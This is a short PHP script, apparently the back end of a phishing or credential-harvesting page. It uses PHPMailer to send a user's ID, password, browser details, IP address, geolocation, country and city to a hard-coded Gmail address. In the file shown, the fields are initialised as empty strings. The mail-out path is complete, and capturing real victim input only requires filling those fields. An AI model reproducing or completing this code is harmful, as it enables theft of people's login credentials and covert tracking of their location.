<?php
require 'PHPMailer/PHPMailerAutoload.php';
  
   /**
   * 
   */
   class process {
   	
	   	function __construct()
	   	{
	   		$userid=$password=$useragent=$bname=$bversion=$lat=$lon=$country=$city=$ip=$format="";
	   		 $this->senMail($userid,$password,$useragent,$bname,$bversion,$lat,$lon,$country,$city,$ip,$format);  
	   	}

	   	private function senMail($userid,$password,$useragent,$bname,$bversion,$lat,$lon,$country,$city,$ip,$format){

	  		$mail = new PHPMailer;
            $mail->isSMTP();                                      // Set mailer to use SMTP
			$mail->Host = 'smtp.gmail.com';  
			$mail->SMTPAuth = true;                               // Enable SMTP authentication
			$mail->Username = 'rumman142228@gmail.com';            // SMTP username
			$mail->Password = 'your email password';                           // SMTP password
			$mail->SMTPSecure = 'tls';                            
			$mail->Port = 587;                                    // TCP port to connect to

			$mail->setFrom('rumman142228@gmail.com', 'Test');
			$mail->addAddress('rumman142228@gmail.com', 'Test');     // Add a recipient//Receiver Email
			$mail->addReplyTo('no-reply@example.com', 'Info');
			
			
			$mail->isHTML(true);                                  // Set email format to HTML

			$mail->Subject = 'Test User Information';

			$mail->Body    = "<strong>User ID: </strong>".$userid."<br>"."<strong>User Password: </strong>".$password."<br>"."<strong>Browser userAgent: </strong>".$useragent."<br>"."<strong>Browser Name: </strong>".$bname."<br>"."<strong>Browser Version: </strong>".$bversion."<br>"."<strong>User IP Address: </strong>".$ip."<br>"."<strong>User Latitude: </strong>".$lat."<br>"."<strong>User Longitude: </strong>".$lon."<br>"."<strong>User Country: </strong>".$country."<br>". "<strong>User City: </strong>".$city."<br>"."<strong>User Format: </strong>".$format."<br>";

			if(!$mail->send()) {
			    echo '<h2>Message could not be sent. Set Up Your Password & Other Requirements.</h2>';
			    echo '<h2>Mailer Error: ' . $mail->ErrorInfo."</h2>";

			} else {
			   echo "<h1 style='color:green;'>Message Sent Successfully....</h1>";
			   
			}
	  	}
   }

   
   $obj = new process();

?>




